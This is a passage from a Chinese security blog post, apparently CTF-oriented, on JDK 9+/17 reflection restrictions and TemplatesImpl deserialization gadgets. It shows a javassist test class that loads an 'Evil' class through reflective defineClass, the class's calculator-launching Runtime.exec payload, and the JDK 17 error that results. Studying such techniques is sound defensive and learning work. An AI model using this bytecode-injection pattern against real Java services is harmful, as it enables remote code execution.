@@ -1,0 +1,906 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='现在实际的 CTF 其实基本都是高版本反序列化，低版本生活中有，但是也很少了，之前有用过这类知识去解题，但是不太理解为什么，现在来学习下\n本文中涉及的 TemplatesImpl 知识并非高版本，因为高版本中需要org.springframework.aop.framework.JdkDynamicAopProxy代理解决其稳定性，但是这个类在spring-aop依赖中。\n反射 jdk9 之后的模块化 Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。\n在此之前，Java 项目由一堆 JAR 包组成。JVM 并不关心 JAR 包之间的依赖关系，只负责把它们解压出的 class 文件堆在 Classpath 下。一旦漏传了某个依赖 JAR，程序只能在运行时抛出 ClassNotFoundException 崩溃。\nJDK 9 引入模块化后，如果模块 A 依赖模块 B，必须在module-info.class中显式声明。这让 JVM 在启动时就能定位并验证所有依赖。\n在 JDK 9 之前，只要利用反射，我们可以访问任何类（public/private）。但在模块化之后，访问权限被严格限制在模块内部。除非目标模块在 module-info 中显式 exports或opens了某个包，否则外部无法通过反射访问其中的类，甚至连setAccessible(true)都会失效。 这直接导致了大量依赖私有属性修改的 Gadget 链在高版本 JDK 中断裂。\njdk17 的强封装 Oracle官方上述文档中提到了Strong Encapsulation，这个主要就是针对java*包下的所有非public字段的如果我们在JDK17的时候对java*下的非公共字段进行反射调用的话就会直接报错。\n其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前还是直接使用反射这个功能，直到JDK17才将其强制化。\n测试类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.get("Evil"); evilClass.setName("Evil" + System.nanoTime()); byte[] bytecodes = evilClass.toBytecode(); Method defineClass= ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", bytecodes, 0, bytecodes.length); } } 恶意类\n'><title>高版本 Jdk 反射 & TemplatesImpl</title><link rel=canonical href=https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="高版本 Jdk 反射 & TemplatesImpl"><meta property='og:description' content='现在实际的 CTF 其实基本都是高版本反序列化，低版本生活中有，但是也很少了，之前有用过这类知识去解题，但是不太理解为什么，现在来学习下\n本文中涉及的 TemplatesImpl 知识并非高版本，因为高版本中需要org.springframework.aop.framework.JdkDynamicAopProxy代理解决其稳定性，但是这个类在spring-aop依赖中。\n反射 jdk9 之后的模块化 Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。\n在此之前，Java 项目由一堆 JAR 包组成。JVM 并不关心 JAR 包之间的依赖关系，只负责把它们解压出的 class 文件堆在 Classpath 下。一旦漏传了某个依赖 JAR，程序只能在运行时抛出 ClassNotFoundException 崩溃。\nJDK 9 引入模块化后，如果模块 A 依赖模块 B，必须在module-info.class中显式声明。这让 JVM 在启动时就能定位并验证所有依赖。\n在 JDK 9 之前，只要利用反射，我们可以访问任何类（public/private）。但在模块化之后，访问权限被严格限制在模块内部。除非目标模块在 module-info 中显式 exports或opens了某个包，否则外部无法通过反射访问其中的类，甚至连setAccessible(true)都会失效。 这直接导致了大量依赖私有属性修改的 Gadget 链在高版本 JDK 中断裂。\njdk17 的强封装 Oracle官方上述文档中提到了Strong Encapsulation，这个主要就是针对java*包下的所有非public字段的如果我们在JDK17的时候对java*下的非公共字段进行反射调用的话就会直接报错。\n其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前还是直接使用反射这个功能，直到JDK17才将其强制化。\n测试类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.get("Evil"); evilClass.setName("Evil" + System.nanoTime()); byte[] bytecodes = evilClass.toBytecode(); Method defineClass= ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", bytecodes, 0, bytecodes.length); } } 恶意类\n'><meta property='og:url' content='https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content><meta property='article:published_time' content='2025-12-10T08:50:24+08:00'><meta property='article:modified_time' content='2025-12-10T08:50:24+08:00'><meta name=twitter:title content="高版本 Jdk 反射 & TemplatesImpl"><meta name=twitter:description content='现在实际的 CTF 其实基本都是高版本反序列化，低版本生活中有，但是也很少了，之前有用过这类知识去解题，但是不太理解为什么，现在来学习下\n本文中涉及的 TemplatesImpl 知识并非高版本，因为高版本中需要org.springframework.aop.framework.JdkDynamicAopProxy代理解决其稳定性，但是这个类在spring-aop依赖中。\n反射 jdk9 之后的模块化 Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。\n在此之前，Java 项目由一堆 JAR 包组成。JVM 并不关心 JAR 包之间的依赖关系，只负责把它们解压出的 class 文件堆在 Classpath 下。一旦漏传了某个依赖 JAR，程序只能在运行时抛出 ClassNotFoundException 崩溃。\nJDK 9 引入模块化后，如果模块 A 依赖模块 B，必须在module-info.class中显式声明。这让 JVM 在启动时就能定位并验证所有依赖。\n在 JDK 9 之前，只要利用反射，我们可以访问任何类（public/private）。但在模块化之后，访问权限被严格限制在模块内部。除非目标模块在 module-info 中显式 exports或opens了某个包，否则外部无法通过反射访问其中的类，甚至连setAccessible(true)都会失效。 这直接导致了大量依赖私有属性修改的 Gadget 链在高版本 JDK 中断裂。\njdk17 的强封装 Oracle官方上述文档中提到了Strong Encapsulation，这个主要就是针对java*包下的所有非public字段的如果我们在JDK17的时候对java*下的非公共字段进行反射调用的话就会直接报错。\n其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前还是直接使用反射这个功能，直到JDK17才将其强制化。\n测试类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.get("Evil"); evilClass.setName("Evil" + System.nanoTime()); byte[] bytecodes = evilClass.toBytecode(); Method defineClass= ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", bytecodes, 0, bytecodes.length); } } 恶意类\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#反射>反射</a><ol><li><a href=#jdk9-之后的模块化>jdk9 之后的模块化</a></li><li><a href=#jdk17-的强封装>jdk17 的强封装</a></li></ol></li><li><a href=#templatesimpl>TemplatesImpl</a><ol><li><a href=#去除-abstracttranslet-限制>去除 AbstractTranslet 限制</a></li><li><a href=#_tfactory-问题>_tfactory 问题</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/javasec/>Javasec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/high-jdk-reflection-templatesimpl/>高版本 Jdk 反射 & TemplatesImpl</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-12-10T08:50:24+08:00>Dec 10, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 64 天前，文中的内容可能已有所发展或发生改变。</span></div><p>现在实际的 CTF 其实基本都是高版本反序列化，低版本生活中有，但是也很少了，之前有用过这类知识去解题，但是不太理解为什么，现在来学习下</p><p>本文中涉及的 TemplatesImpl 知识并非高版本，因为高版本中需要<code>org.springframework.aop.framework.JdkDynamicAopProxy</code>代理解决其稳定性，但是这个类在<code>spring-aop</code>依赖中。</p><h2 id=反射>反射</h2><h3 id=jdk9-之后的模块化>jdk9 之后的模块化</h3><p>Java模块化主要是用来解决依赖的问题，以及给原生JDK瘦身这两个作用。</p><p>在此之前，Java 项目由一堆 JAR 包组成。JVM 并不关心 JAR 包之间的依赖关系，只负责把它们解压出的 class 文件堆在 Classpath 下。一旦漏传了某个依赖 JAR，程序只能在运行时抛出 <code>ClassNotFoundException</code> 崩溃。</p><p>JDK 9 引入模块化后，如果模块 A 依赖模块 B，必须在<code>module-info.class</code>中显式声明。这让 JVM 在启动时就能定位并验证所有依赖。</p><p>在 JDK 9 之前，只要利用反射，我们可以访问任何类（public/private）。但在模块化之后，访问权限被严格限制在模块内部。除非目标模块在 <code>module-info</code> 中显式 <code>exports</code>或<code>opens</code>了某个包，否则外部无法通过反射访问其中的类，甚至连<code>setAccessible(true)</code>都会失效。 这直接导致了大量依赖私有属性修改的 Gadget 链在高版本 JDK 中断裂。</p><h3 id=jdk17-的强封装>jdk17 的强封装</h3><p>Oracle官方上述文档中提到了<code>Strong Encapsulation</code>，这个主要就是针对<code>java*</code>包下的所有非public字段的如果我们在JDK17的时候对<code>java*</code>下的非公共字段进行反射调用的话就会直接报错。</p><p>其实这个东西在JDK9之后就开始被标记为了不安全选项,但是由于很多大型项目之前还是直接使用反射这个功能，直到JDK17才将其强制化。</p><p>测试类</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>test</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>evilClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytecodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Method</span><span class=w> </span><span class=n>defineClass</span><span class=o>=</span><span class=w> </span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;defineClass&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defineClass</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defineClass</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>getSystemClassLoader</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;attack&#34;</span><span class=p>,</span><span class=w> </span><span class=n>bytecodes</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>恶意类</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Evil</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;open -a Calculator&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>){</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>报错</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>/</span><span class=n>Library</span><span class=o>/</span><span class=n>Java</span><span class=o>/</span><span class=n>JavaVirtualMachines</span><span class=o>/</span><span class=n>jdk</span><span class=o>-</span><span class=n>17</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>5</span><span class=p>.</span><span class=na>jdk</span><span class=o>/</span><span class=n>Contents</span><span class=o>/</span><span class=n>Home</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>java</span><span class=w> </span><span class=o>-</span><span class=n>javaagent</span><span class=p>:</span><span class=o>/</span><span class=n>Applications</span><span class=o>/</span><span class=n>IntelliJ</span><span class=w> </span><span class=n>IDEA</span><span class=p>.</span><span class=na>app</span><span class=o>/</span><span class=n>Contents</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>idea_rt</span><span class=p>.</span><span class=na>jar</span><span class=o>=</span><span class=n>56613</span><span class=w> </span><span class=o>-</span><span class=n>Dfile</span><span class=p>.</span><span class=na>encoding</span><span class=o>=</span><span class=n>UTF</span><span class=o>-</span><span class=n>8</span><span class=w> </span><span class=o>-</span><span class=n>classpath</span><span class=w> </span><span class=o>/</span><span class=n>Users</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=n>Downloads</span><span class=o>/</span><span class=n>Jaba</span><span class=o>/</span><span class=n>jdk17</span><span class=o>/</span><span class=n>target</span><span class=o>/</span><span class=n>classes</span><span class=p>:</span><span class=o>/</span><span class=n>Users</span><span class=o>/</span><span class=n>admin</span><span class=o>/</span><span class=p>.</span><span class=na>m2</span><span class=o>/</span><span class=n>repository</span><span class=o>/</span><span class=n>org</span><span class=o>/</span><span class=n>javassist</span><span class=o>/</span><span class=n>javassist</span><span class=o>/</span><span class=n>3</span><span class=p>.</span><span class=na>29</span><span class=p>.</span><span class=na>2</span><span class=o>-</span><span class=n>GA</span><span class=o>/</span><span class=n>javassist</span><span class=o>-</span><span class=n>3</span><span class=p>.</span><span class=na>29</span><span class=p>.</span><span class=na>2</span><span class=o>-</span><span class=n>GA</span><span class=p>.</span><span class=na>jar</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>test</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Exception</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=n>thread</span><span class=w> </span><span class=s>&#34;main&#34;</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>InaccessibleObjectException</span><span class=p>:</span><span class=w> </span><span class=n>Unable</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>make</span><span class=w> </span><span class=kd>protected</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>Class</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ClassLoader</span><span class=p>.</span><span class=na>defineClass</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>String</span><span class=p>,</span><span class=kt>byte</span><span class=o>[]</span><span class=p>,</span><span class=kt>int</span><span class=p>,</span><span class=kt>int</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ClassFormatError</span><span class=w> </span><span class=n>accessible</span><span class=p>:</span><span class=w> </span><span class=n>module</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=n>not</span><span class=w> </span><span class=s>&#34;opens java.lang&#34;</span><span class=w> </span><span class=n>to</span><span class=w> </span><span class=n>unnamed</span><span class=w> </span><span class=n>module</span><span class=w> </span><span class=nd>@7aec35a</span><span class=w>
